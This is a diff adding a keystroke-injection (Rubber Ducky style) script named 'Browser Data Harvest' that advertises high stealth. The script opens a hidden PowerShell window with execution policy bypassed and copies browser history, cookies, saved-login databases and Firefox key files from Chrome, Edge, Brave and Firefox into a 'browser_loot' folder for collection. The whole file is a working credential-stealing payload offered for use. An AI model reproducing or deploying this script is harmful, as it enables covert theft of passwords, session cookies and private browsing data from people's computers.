@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | Browser Data Harvest
+REM  FLLC - by PERSON FU
+REM  Time: ~15 seconds | Stealth: HIGH
+REM  Grabs browser history, bookmarks, cookies DB
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$d=[Environment]::GetFolderPath('Desktop')+'\browser_loot';md $d -f|Out-Null;$c=@{Chrome=\"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\";Edge=\"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\";Brave=\"$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\";Firefox=\"$env:APPDATA\Mozilla\Firefox\Profiles\"};foreach($b in $c.Keys){$p=$c[$b];if(Test-Path $p){$bd=\"$d\$b\";md $bd -f|Out-Null;'History','Bookmarks','Cookies','Login Data','Web Data','Top Sites','Preferences'|%{$f=\"$p\$_\";if(Test-Path $f){cp $f \"$bd\$_\" -f 2>$null}};if($b -eq 'Firefox'){gci $p -Dir|%{$fp=$_.FullName;'places.sqlite','cookies.sqlite','logins.json','key4.db','cert9.db'|%{$ff=\"$fp\$_\";if(Test-Path $ff){cp $ff \"$bd\$_\" -f 2>$null}}}}}};'Done'|Out-File \"$d\complete.txt\""
+ENTER
+DELAY 500
